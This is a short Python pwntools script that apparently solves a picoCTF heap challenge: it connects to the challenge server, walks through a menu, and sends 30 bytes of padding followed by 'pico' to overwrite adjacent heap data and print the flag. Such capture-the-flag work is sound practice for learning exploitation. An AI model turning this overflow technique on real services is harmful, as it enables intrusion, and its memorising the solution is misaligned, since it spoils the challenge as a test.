from pwn import *

address = 'tethys.picoctf.net'
port = 51753

payload = b'A' * 30
payload += b'pico'

with remote(address,port) as target:
	target.recvuntil(b'Enter your choice: ')
	target.sendline(b'5')
	target.recvuntil(b'Enter your choice:')
	target.sendline(b'2')
	target.recvuntil(b'Size of object allocation: ')
	target.sendline(b'35')
	target.recvuntil(b'Data for flag: ')
	target.sendline(payload)
	target.recvuntil(b'Enter your choice: ')
	target.sendline(b'4')
	target.recvline()
	print(f'Flag: {target.recvuntil(b"}").decode()}')
